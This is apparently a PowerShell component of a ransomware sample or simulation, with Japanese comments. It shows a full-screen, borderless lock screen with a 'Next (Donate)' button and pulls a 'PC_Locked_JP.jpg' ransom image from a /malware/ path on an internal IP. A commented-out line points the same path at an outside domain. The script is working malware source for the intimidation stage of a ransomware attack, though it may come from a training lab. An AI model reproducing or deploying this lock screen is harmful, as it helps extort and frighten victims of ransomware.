Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
 




## 完了画面表示
#デスクトップサイズ取得
$dskHeight = gwmi win32_videocontroller | select -ExpandProperty CurrentVerticalResolution
$dskWidth = gwmi win32_videocontroller | select -ExpandProperty CurrentHorizontalResolution
#$formHeight = $dskHeight * 0.8
#$formWidth = $dskWidth * 0.8
$formHeight = 600
$formWidth = 800
#echo $formHeight
#echo $formWidth

#フォーム
$form = New-Object System.Windows.Forms.Form 
$form.Text = "イメージテスト"
#$form.Size = New-Object System.Drawing.Size($formWidth,$formHeight) 
$form.StartPosition = "CenterScreen"
$form.AutoSize = $True
$form.FormBorderStyle = "None"
#$form.WindowState = "Maximized"
$form.AutoSizeMode = "GrowAndShrink"
$form.BackColor = "#FFFFFFFF"

#寄付ボタン
$buttonPy = $formHeight - 65
$buttonPx = $formWidth - 185
#echo $buttonPy, $buttonPx
$donateButton = New-Object System.Windows.Forms.Button
$donateButton.Location = New-Object System.Drawing.Point($buttonPx,$buttonPy)
$donateButton.Size = New-Object System.Drawing.Size(150,50)
$donateButton.Text = 'Next (Donate)'
$donateButton.ForeColor= "White"
$donateButton.BackColor= "Blue"
$donateButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.AcceptButton = $donateButton
$form.Controls.Add($donateButton)

 
#PictureBox
#画像データの取得
#$webReq = [System.Net.HttpWebRequest]::Create("http://www.c-atkkfwh.com/malware/PC_Locked_JP.jpg")
$webReq = [System.Net.HttpWebRequest]::Create("http://10.10.10.251/malware/PC_Locked_JP.jpg")
$webReq.Method = "GET"
$webReq.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"
$webResp = $webReq.GetResponse()
$ms = New-Object System.IO.MemoryStream($bytes)
$pic = New-Object System.Windows.Forms.PictureBox
$pic.Size = New-Object System.Drawing.Size($formWidth,$formHeight)
#$pic.Image = [System.Drawing.Image]::FromFile("\DATA\CSL\R_Malware\newRansom\PC_Locked_JP.jpg")
$pic.Image = [System.Drawing.Image]::FromStream($webResp.getResponseStream())
$pic.Location = New-Object System.Drawing.Point(0,0) 
$pic.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom
$form.Controls.Add($pic) 
 
#フォームを表示
$result = $form.ShowDialog()
$form.WindowState = "Normal"
$form.FormBorderStyle = "None"
$form.WindowState = "Maximized"
 
#リソースを開放
$pic.Image.Dispose()
$pic.Image = $null
